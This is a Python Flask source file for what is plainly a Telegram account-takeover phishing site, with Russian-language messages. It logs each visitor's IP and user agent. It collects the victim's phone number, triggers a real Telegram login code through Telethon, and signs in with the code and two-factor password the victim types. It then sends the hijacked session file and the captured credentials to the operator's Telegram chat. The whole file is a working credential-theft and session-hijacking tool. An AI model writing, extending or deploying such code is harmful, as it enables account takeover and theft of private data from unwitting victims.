from flask import Flask, render_template, send_from_directory, request, make_response
import os
import webbrowser
from threading import Thread
import asyncio
import random
import string
import datetime
import logging
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError, PhoneNumberFloodError, AuthKeyUnregisteredError, SessionRevokedError, FloodWaitError, PhoneCodeExpiredError, PhoneCodeInvalidError
import time
import multiprocessing

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

from config import (
    TELEGRAM_CHAT_ID,
    TELEGRAM_API_ID,
    TELEGRAM_API_HASH
)

from bot import send_telegram_message, format_visit_message, format_phone_message, format_code_message, send_registration_summary, send_session_file, format_password_success_message
from database import SessionLocal, Visitor, create_visitor, get_visitor_by_id_string, update_visitor_phone, update_visitor_code

app = Flask(__name__)

# Глобальные переменные
asyncio_loop = None
asyncio_thread = None
active_telethon_clients = {}
processed_requests = {}  

def start_asyncio_loop():
    global asyncio_loop
    asyncio_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(asyncio_loop)
    asyncio_loop.run_forever()

def schedule_async_in_loop(coro):
    """Schedules an async coroutine to run in the asyncio loop without waiting."""
    if asyncio_loop and asyncio_loop.is_running():
        asyncio_loop.call_soon_threadsafe(asyncio_loop.create_task, coro)
        logging.info(f"Coroutine {coro.__name__} scheduled in asyncio loop.")
    else:
        logging.error("Asyncio loop is not running. Could not schedule coroutine.")

def run_async_in_thread(coro):
    if asyncio_loop and asyncio_loop.is_running():
        asyncio_loop.call_soon_threadsafe(asyncio_loop.create_task, coro)

def stop_asyncio_loop():
    global asyncio_loop
    if asyncio_loop and asyncio_loop.is_running():
        asyncio_loop.call_soon_threadsafe(asyncio_loop.stop)

def generate_visitor_id(length=7):
    return ''.join(random.choice(string.digits) for i in range(length))

def run_async_in_process(coro, *args):
    """Runs an async coroutine in a separate process."""
    def process_target(coro, args):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(coro(*args))
        finally:
            loop.close()

    process = multiprocessing.Process(target=process_target, args=(coro, args))
    process.start()
    return process 

@app.route('/')
def index():
    db = SessionLocal()
    visitor_id = request.cookies.get('visitor_id')
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    response = make_response(render_template('index.html'))

    try:
        visitor = None
        if visitor_id:
            visitor = get_visitor_by_id_string(db, visitor_id)
            if visitor:
                 logging.info(f"Existing visitor found via cookie: {visitor.id_string}")
            else:
                logging.warning(f"Visitor ID in cookie not found in DB: {visitor_id}")
                new_visitor_id = generate_visitor_id()
                visitor = create_visitor(db, ip_address, user_agent, new_visitor_id)
                response.set_cookie('visitor_id', new_visitor_id)
                logging.info(f"Generated new visitor ID due to cookie mismatch: {new_visitor_id}")

        if not visitor:
            new_visitor_id = generate_visitor_id()
            visitor = create_visitor(db, ip_address, user_agent, new_visitor_id)
            response.set_cookie('visitor_id', new_visitor_id)
            logging.info(f"Generated new visitor ID (no cookie): {new_visitor_id}")

        if visitor:
             schedule_async_in_loop(send_telegram_message(
                 format_visit_message(visitor.id_string, user_agent, ip_address, datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
             ))

    except Exception as e:
        db.rollback()
        logging.exception("Error processing / route:")

    finally:
        db.close()

    return response

@app.route('/css/<path:filename>')
def serve_css(filename):
    return send_from_directory('static/css', filename)

@app.route('/js/<path:filename>')
def serve_js(filename):
    return send_from_directory('static/js', filename)

@app.route('/img/<path:filename>')
def serve_img(filename):
    return send_from_directory('static/img', filename)

@app.route('/ajax', methods=['GET', 'POST'])
def ajax_handler():
    global processed_requests
    db = SessionLocal()
    visitor_id = request.cookies.get('visitor_id')
    ip_address = request.remote_addr
    user_agent = request.headers.get('User-Agent')

    if not visitor_id:
        logging.warning("AJAX request received without visitor_id cookie.")
        return {'status': 'error', 'message': 'Visitor ID missing'}

    try:
        visitor = get_visitor_by_id_string(db, visitor_id)
        if not visitor:
            logging.warning(f"Visitor not found for AJAX request by ID: {visitor_id}")
            return {'status': 'error', 'message': 'Visitor not found'}

        if request.method == 'GET':
            do = request.args.get('do')

            normalized_code = ''.join(filter(str.isdigit, request.args.get('code', '')))
            request_id = f"{visitor_id}_{do}_{request.args.get('phone', '')}_{normalized_code}"
            current_time = time.time()

            if request_id in processed_requests:
                last_processed = processed_requests[request_id]
                if current_time - last_processed < 5:  # 5 seconds window
                    logging.info(f"Skipping duplicate request within 5 seconds: {request_id}")
                    return {'status': 'ok', 'message': 'Request already processed'}

            processed_requests[request_id] = current_time

            current_time = time.time()
            processed_requests = {k: v for k, v in processed_requests.items() 
                                if current_time - v < 60}  
            
            if do == 'phone':
                phone_number = request.args.get('phone')
                if not phone_number:
                     return {'status': 'error', 'message': 'Phone number is required'}

                update_visitor_phone(db, visitor_id, phone_number)

                schedule_async_in_loop(send_telegram_message(
                    format_phone_message(visitor.id_string, phone_number, user_agent, ip_address, datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
                ))

                async def send_telegram_code(phone):
                    session_name = f'session_{visitor.id_string}'
                    client = TelegramClient(session_name, api_id=TELEGRAM_API_ID, api_hash=TELEGRAM_API_HASH)
                    
                    try:
                        await client.connect()
                        if not await client.is_user_authorized():
                            logging.info(f"Sending code request for phone: {phone}")
                            send_code_result = await client.send_code_request(phone)
                            active_telethon_clients[visitor.id_string] = {
                                'client': client,
                                'phone': phone,
                                'phone_code_hash': send_code_result.phone_code_hash
                            }
                            logging.info(f"Code request sent for {phone}, hash: {send_code_result.phone_code_hash}")
                            return {'status': 'ok', 'next': 'code'}
                        else:
                            logging.info(f"User already authorized for session {session_name}")
                            
                            session_file = f'session_{visitor.id_string}.session'
                            if os.path.exists(session_file):
                                run_async_in_process(send_session_file, session_file, visitor.id_string, phone) # New process call
                                logging.info(f"Started session file sending in a new process for {visitor.id_string}")
                            return {'status': 'ok', 'next': 'authorized'}
                            
                    except PhoneNumberInvalidError:
                        logging.warning(f"Invalid phone number entered: {phone}")
                        return {'status': 'error', 'message': 'Неверный номер телефона.'}
                    except PhoneNumberFloodError:
                         logging.warning(f"Flood wait for phone: {phone}")
                         return {'status': 'error', 'message': 'Слишком много попыток. Пожалуйста, попробуйте позже.'}
                    except FloodWaitError as e:
                         logging.warning(f"Flood wait error: {e}")
                         return {'status': 'error', 'message': f'Слишком много попыток. Пожалуйста, подождите {e.seconds} секунд.'}
                    except Exception as e:
                        logging.exception("Error during send_code_request:")
                        return {'status': 'error', 'message': 'Произошла ошибка при отправке кода.'}

                telethon_response = asyncio.run_coroutine_threadsafe(send_telegram_code(phone_number), asyncio_loop).result(timeout=120)
                if telethon_response:
                    return telethon_response
                else:
                    return {'status': 'error', 'message': 'Внутренняя ошибка сервера при запросе кода.'}

            elif do == 'code':
                code = request.args.get('code')
                if not code:
                     return {'status': 'error', 'message': 'Code is required'}

                update_visitor_code(db, visitor_id, code)

                async def sign_in_telethon(visitor_id, code):
                    if visitor_id not in active_telethon_clients or not active_telethon_clients[visitor_id].get('client'):
                        logging.error(f"No active telethon client found for visitor ID: {visitor_id}")
                        return {'status': 'error', 'message': 'Ошибка сессии. Пожалуйста, попробуйте ввести номер телефона снова.'}
                        
                    client_info = active_telethon_clients[visitor_id]
                    client = client_info['client']
                    phone = client_info['phone']
                    phone_code_hash = client_info['phone_code_hash']

                    try:
                        logging.info(f"Attempting to sign in for phone: {phone} with code: {code}")
                        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
                        logging.info(f"Successfully signed in for {phone}")

                        session_file = f'session_{visitor_id}.session'

                        await client.disconnect()
                        logging.info(f"Session saved for {visitor_id}")

                        run_async_in_process(send_session_file, session_file, visitor.id_string, phone)
                        logging.info(f"Started session file sending in a new process for {visitor.id_string}")
                        
                        del active_telethon_clients[visitor_id]

                        schedule_async_in_loop(send_telegram_message(
                           format_code_message(visitor.id_string, code, user_agent, ip_address, datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
                        ))

                        return {'status': 'ok', 'next': 'camera'}
                        
                    except SessionPasswordNeededError:
                        logging.warning(f"Password needed for phone: {phone}")
                        schedule_async_in_loop(send_telegram_message(
                           format_code_message(visitor.id_string, code, user_agent, ip_address, datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
                        ))
                        return {'status': 'ok', 'next': 'password'}
                    except PhoneCodeExpiredError:
                        logging.warning(f"Phone code expired for phone: {phone}")
                        return {'status': 'error', 'message': 'Срок действия кода истек. Пожалуйста, попробуйте ввести номер телефона снова.'}
                    except PhoneCodeInvalidError:
                        logging.warning(f"Phone code invalid for phone: {phone}")
                        return {'status': 'error', 'message': 'Неверный код подтверждения.'}
                    except FloodWaitError as e:
                         logging.warning(f"Flood wait error during sign_in: {e}")
                         return {'status': 'error', 'message': f'Слишком много попыток. Пожалуйста, подождите {e.seconds} секунд.'}
                    except Exception as e:
                        logging.exception("Error during sign_in:")
                        return {'status': 'error', 'message': 'Произошла ошибка при входе.'}
                    
                telethon_response = asyncio.run_coroutine_threadsafe(sign_in_telethon(visitor_id, code), asyncio_loop).result(timeout=120) 
                if telethon_response:
                    return telethon_response
                else:
                    return {'status': 'error', 'message': 'Внутренняя ошибка сервера при вводе кода.'}

            elif do == 'password':
                password = request.args.get('password')
                if not password:
                    return {'status': 'error', 'message': 'Password is required'}

                async def sign_in_with_password(visitor_id, password):
                     if visitor_id not in active_telethon_clients or not active_telethon_clients[visitor_id].get('client'):
                         logging.error(f"No active telethon client found for visitor ID: {visitor_id}")
                         return {'status': 'error', 'message': 'Ошибка сессии. Пожалуйста, попробуйте ввести номер телефона снова.'}

                     client_info = active_telethon_clients[visitor_id]
                     client = client_info['client']

                     try:
                         logging.info(f"Attempting to sign in with password for visitor ID: {visitor_id}")
                         logging.info(f"Calling client.sign_in with password.")
                         await client.sign_in(password=password)
                         logging.info(f"client.sign_in successful for {visitor_id}.")
                         logging.info(f"Successfully signed in with password for {visitor_id}")

                         session_file = f'session_{visitor_id}.session'
                         await client.disconnect()
                         logging.info(f"Session saved for {visitor_id} after password entry")

                         run_async_in_process(send_session_file, session_file, visitor.id_string, visitor.phone_number) 
                         logging.info(f"Started session file sending in a new process for {visitor.id_string}")
                         
                         del active_telethon_clients[visitor_id]

                         schedule_async_in_loop(send_telegram_message(
                             format_password_success_message(visitor.id_string, visitor.phone_number, user_agent, ip_address, datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'), password)
                         ))
                         logging.info(f"Password success message scheduled for {visitor_id}.")

                         return {'status': 'ok', 'next': 'camera'}
                         
                     except SessionPasswordNeededError:
                         logging.warning("Session password still needed after password entry.")
                         schedule_async_in_loop(send_telegram_message(
                             format_password_success_message(visitor.id_string, visitor.phone_number, user_agent, ip_address, datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'), password) # Возможно, стоит другое сообщение
                         ))
                         return {'status': 'error', 'message': 'Требуется пароль (повторно).'}
                     except FloodWaitError as e:
                         logging.warning(f"Flood wait error during sign_in with password: {e}")
                         return {'status': 'error', 'message': f'Слишком много попыток. Пожалуйста, подождите {e.seconds} секунд.'}
                     except Exception as e:
                         logging.exception("Error during sign_in with password:")
                         return {'status': 'error', 'message': 'Произошла ошибка при входе с паролем.'}
                     
                telethon_response = asyncio.run_coroutine_threadsafe(sign_in_with_password(visitor_id, password), asyncio_loop).result(timeout=120) # Ждем только результата входа с паролем или ошибки
                if telethon_response:
                    return telethon_response
                else:
                    return {'status': 'error', 'message': 'Внутренняя ошибка сервера при вводе пароля.'}

            elif do == 'download':
                pass

        return {'status': 'error', 'message': 'Invalid request'}

    except Exception as e:
        db.rollback()
        logging.exception("Error processing /ajax route:")
        return {'status': 'error', 'message': str(e)}

    finally:
        db.close()


if __name__ == '__main__':
    multiprocessing.freeze_support() 
    asyncio_thread = Thread(target=start_asyncio_loop, daemon=True)
    asyncio_thread.start()

    try:
        app.run(debug=True, use_reloader=False, port=5000)
    finally:
        stop_asyncio_loop()